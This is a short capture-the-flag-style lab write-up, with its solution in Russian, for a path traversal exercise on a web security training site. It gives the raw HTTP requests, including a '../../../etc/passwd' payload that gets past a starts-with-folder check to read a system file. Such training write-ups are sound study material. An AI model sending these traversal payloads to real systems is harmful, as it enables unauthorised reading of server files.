# Lab: File path traversal, validation of start of path
PRACTITIONER

This lab contains a path traversal vulnerability in the display of product images.

The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.

To solve the lab, retrieve the contents of the /etc/passwd file.

## Решение
Попробую обратиться по прямому пути:
```
GET /image?filename=/etc/passwd HTTP/2
Host: 0a0d00d304ac210d808dc13800c1003c.web-security-academy.net
Cookie: session=U1jsQeIVyP4bZR0XlIs0V2iNJt49A2KY
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: image/avif,image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0d00d304ac210d808dc13800c1003c.web-security-academy.net/
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Te: trailers
```
Ответ: `"Missing parameter 'filename'"`

Попробую выйти в корень (на три уровня выше) и оттуда обратиться к /etc/passwd:
```
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
Host: 0a0d00d304ac210d808dc13800c1003c.web-security-academy.net
Cookie: session=U1jsQeIVyP4bZR0XlIs0V2iNJt49A2KY
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: image/avif,image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0d00d304ac210d808dc13800c1003c.web-security-academy.net/
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Te: trailers
```
Работает. Задание выполнено.
